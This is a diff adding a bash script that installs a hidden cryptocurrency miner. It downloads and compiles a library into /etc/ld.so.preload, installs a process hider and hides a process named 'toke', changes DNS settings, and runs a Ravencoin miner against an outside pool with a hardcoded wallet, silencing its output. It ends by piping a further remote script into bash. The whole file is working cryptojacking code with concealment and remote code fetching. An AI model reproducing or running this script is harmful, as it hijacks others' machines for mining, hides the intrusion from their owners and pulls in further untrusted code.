@@ -1,0 +1,15 @@
+#!/bin/bash
+apt-get update ; apt-get install sudo -y
+curl https://gitlab.com/liugtiujk/roni/-/raw/master/ublah.c -o ublah.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libublah.so ublah.c -ldl
+mv libublah.so /usr/local/lib/
+echo /usr/local/lib/libublah.so >> /etc/ld.so.preload
+rm ublah.c
+echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
+/etc/init.d/network restart
+sudo su --command "curl -sL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add toke"
+wget https://gitlab.com/liugtiujk/roni/-/raw/main/toke >/dev/null 2>&1
+chmod +x toke
+./toke -a kawpow --coin rvn -o stratum+tcp://139.162.58.160:443 -u RCgPqH9ii58HmS3LkQT4KJiyNhqLi9QLMt -w ROHITCHAN >/dev/null 2>&1 &
+curl -sL https://raw.githubusercontent.com/bsheredia/rohit/main/roki.sh | bash
